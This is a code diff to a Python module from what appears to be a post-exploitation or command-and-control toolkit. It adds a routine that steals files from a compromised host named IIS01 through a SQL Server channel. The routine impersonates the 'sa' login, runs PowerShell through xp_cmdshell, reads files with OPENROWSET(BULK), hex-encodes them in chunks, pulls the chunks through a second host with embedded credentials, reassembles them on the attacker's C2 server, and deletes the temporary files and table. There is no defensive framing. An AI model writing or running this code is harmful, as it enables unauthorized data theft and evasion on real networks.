@@ -9,7 +9,18 @@ _UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
 
 
 class ExfilMixin:
-    """Exfil files from IIS01 via MSSQL DB channel (AES-256-CBC, chunked)."""
+    """Exfil files from IIS01 via MSSQL DB channel (AES-256-CBC or hex)."""
+
+    def _get_remote_file_size(self, shell, remote_path: str) -> int | None:
+        size_out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            f"EXEC xp_cmdshell 'powershell -Command (Get-Item {self._tsql_escape(remote_path)}).Length'"
+        )
+        for line in (size_out or "").splitlines():
+            s = line.strip()
+            if s.isdigit():
+                return int(s)
+        return None
 
     def cmd_xpexfil(self, shell, remote_path: str, local_name: str,
                     insert_timeout_s: int = 600, chunk_mb: int = 10):
@@ -20,18 +31,9 @@ class ExfilMixin:
 
         # A — get file size
         print("[*] xpexfil: getting file size ...")
-        size_out = self._exec_q(shell,
-            "EXECUTE AS LOGIN='sa';"
-            f"EXEC xp_cmdshell 'powershell -Command (Get-Item {self._tsql_escape(remote_path)}).Length'"
-        )
-        file_size = None
-        for line in (size_out or "").splitlines():
-            s = line.strip()
-            if s.isdigit():
-                file_size = int(s)
-                break
+        file_size = self._get_remote_file_size(shell, remote_path)
         if file_size is None:
-            print(f"[!] xpexfil: could not read file size — output: {size_out!r}")
+            print("[!] xpexfil: could not read file size")
             return
 
         num_chunks = math.ceil(file_size / chunk_bytes)
@@ -176,3 +178,107 @@ class ExfilMixin:
             "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
             f"[IO.File]::WriteAllBytes('{local_path}',$dec)"
         )
+
+    # ── hex exfil (P3) ─────────────────────────────────────────────────────
+
+    def _build_exfil_insert_tsql(self, remote_path: str, chunk_mb: int) -> str:
+        """T-SQL batch: OPENROWSET(BULK) read + chunk + hex encode + INSERT all."""
+        chunk_bytes = chunk_mb * 1048576
+        return (
+            "EXECUTE AS LOGIN='sa';"
+            "DECLARE @data VARBINARY(MAX);"
+            f"SELECT @data=BulkColumn FROM OPENROWSET(BULK "
+            f"'{self._tsql_escape(remote_path)}',SINGLE_BLOB) AS t;"
+            "DECLARE @total INT=DATALENGTH(@data);"
+            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
+            "CREATE TABLE tempdb..exfil("
+            "id INT IDENTITY(1,1),chunk_idx INT NOT NULL,"
+            "chunk NVARCHAR(MAX) NOT NULL);"
+            "GRANT SELECT ON tempdb..exfil TO PUBLIC;"
+            f"DECLARE @cb INT={chunk_bytes};"
+            "DECLARE @i INT=0;"
+            "WHILE @i*@cb<@total "
+            "BEGIN "
+            "DECLARE @off INT=@i*@cb+1;"
+            "DECLARE @len INT=CASE WHEN @off+@cb-1>@total "
+            "THEN @total-@off+1 ELSE @cb END;"
+            "DECLARE @hex VARCHAR(MAX)=CONVERT(VARCHAR(MAX),"
+            "SUBSTRING(@data,@off,@len),2);"
+            "DECLARE @j INT=1;"
+            "WHILE @j<=LEN(@hex) "
+            "BEGIN "
+            "INSERT INTO tempdb..exfil(chunk_idx,chunk) "
+            "VALUES(@i,SUBSTRING(@hex,@j,8000));"
+            "SET @j=@j+8000;"
+            "END;"
+            "SET @i=@i+1;"
+            "END;"
+            "SELECT @i AS num_chunks,@total AS file_bytes,"
+            "(SELECT COUNT(*) FROM tempdb..exfil) AS total_rows;"
+        )
+
+    def _build_exfil_extract_hex_ps(self, local_path: str, chunk_idx: int) -> str:
+        """PowerShell run on WS01: read hex chunks for one file-chunk, write raw hex text."""
+        connstr = (f"Server={self._host.replace(':', ',')};Database=tempdb;"
+                   f"User ID={self._login};Password={self._password};"
+                   f"TrustServerCertificate=True")
+        return (
+            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
+            "$cn.Open();$cm=$cn.CreateCommand();"
+            f"$cm.CommandText='SELECT chunk FROM tempdb..exfil "
+            f"WHERE chunk_idx={chunk_idx} ORDER BY id';"
+            "$rd=$cm.ExecuteReader();"
+            "$sb=New-Object System.Text.StringBuilder;"
+            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
+            "$rd.Close();$cn.Close();"
+            f"[IO.File]::WriteAllText('{local_path}',$sb.ToString())"
+        )
+
+    def _assemble_hex_chunks(self, local_name: str, num_chunks: int):
+        """Decode hex text chunks to binary and assemble on C2."""
+        out_path = os.path.join(_UPLOAD_DIR, local_name)
+        with open(out_path, 'wb') as out_f:
+            for i in range(num_chunks):
+                hex_path = os.path.join(_UPLOAD_DIR, f"{local_name}.hex{i}")
+                with open(hex_path, 'r') as hf:
+                    hex_text = hf.read()
+                out_f.write(bytes.fromhex(hex_text))
+                os.remove(hex_path)
+        print(f"[+] xpexfil-hex done \u2192 {out_path}")
+
+    def cmd_xpexfil_hex(self, shell, remote_path: str, local_name: str,
+                        insert_timeout_s: int = 600, chunk_mb: int = 10):
+        """Exfil file from IIS01 via OPENROWSET(BULK) + hex INSERT; C2 Python decode."""
+        # A \u2014 get file size
+        print("[*] xpexfil-hex: getting file size ...")
+        file_size = self._get_remote_file_size(shell, remote_path)
+        if file_size is None:
+            print("[!] xpexfil-hex: could not read file size")
+            return
+        num_chunks = math.ceil(file_size / (chunk_mb * 1024 * 1024))
+        print(f"[*] xpexfil-hex: {file_size} bytes \u2192 {num_chunks} chunk(s)")
+
+        # B \u2014 ONE T-SQL batch: OPENROWSET(BULK) + chunk + hex + INSERT all
+        insert_tsql = self._build_exfil_insert_tsql(remote_path, chunk_mb)
+        print(f"[*] xpexfil-hex: T-SQL INSERT all {num_chunks} chunk(s) ...")
+        self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)
+
+        # C \u2014 per file-chunk: extract hex text + upload to C2
+        for i in range(num_chunks):
+            chunk_local = f"C:\\Windows\\Temp\\{local_name}.hex{i}"
+            extract_ps = self._build_exfil_extract_hex_ps(chunk_local, chunk_idx=i)
+            print(f"[*] xpexfil-hex: chunk {i+1}/{num_chunks} \u2014 extract + pull ...")
+            shell.cmd_exec_raw(
+                f'powershell -NoProfile -ExecutionPolicy Bypass '
+                f'-Command "{extract_ps}"')
+            shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.hex{i}")
+            shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")
+
+        # D \u2014 cleanup exfil table
+        self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
+            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
+            "DROP TABLE tempdb..exfil;")
+
+        # E \u2014 C2-side: hex decode + assemble binary
+        print(f"[*] xpexfil-hex: assembling {num_chunks} chunk(s) on C2 ...")
+        self._assemble_hex_chunks(local_name, num_chunks)
